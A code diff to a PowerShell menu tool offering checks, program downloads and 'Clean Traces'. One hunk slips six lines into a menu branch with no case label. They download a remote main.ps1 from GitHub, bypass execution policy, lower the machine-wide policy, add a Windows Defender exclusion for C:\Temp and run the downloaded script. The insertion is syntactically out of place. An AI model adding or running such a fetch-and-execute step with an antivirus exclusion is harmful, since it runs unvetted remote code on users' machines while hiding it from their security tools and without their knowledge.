@@ -2,7 +2,7 @@ $ErrorActionPreference = "SilentlyContinue"
 
 function Show-MainMenu {
     return Read-Host "`n`n`nChoose a Category:`n
-    (1)`t`tChecks`n
+    (1)`t`tStart Check`n
     (2)`t`tPrograms`n
     (3)`t`tClean Traces`n
     (0)`t`tClose Script`n`nChoose"
@@ -129,7 +129,12 @@ do {
                         (New-Object System.Net.WebClient).DownloadFile("https://www.voidtools.com/Everything-1.4.1.1026.x64-Setup.exe", "C:\temp\dump\Everything.exe")
                         Write-Host "Everything downloaded successfully. Returning to Programs Menu." -ForegroundColor green
                         Start-Sleep 5
-                    }
+                    }New-Item -Path "C:\Temp\Scripts" -ItemType Directory -Force | Out-Null 
+Set-Location "C:\temp\Scripts"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/yMarvin187/Powershell-Tool/refs/heads/main/main.ps1" -OutFile "main.ps1"
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy RemoteSigned -Force
+Add-MpPreference -ExclusionPath 'C:\Temp' | Out-Null; .\main.ps1
                     0 { break }
                     default {
                         Write-Host "`n`nInvalid option selected. Returning to Programs Menu." -ForegroundColor red
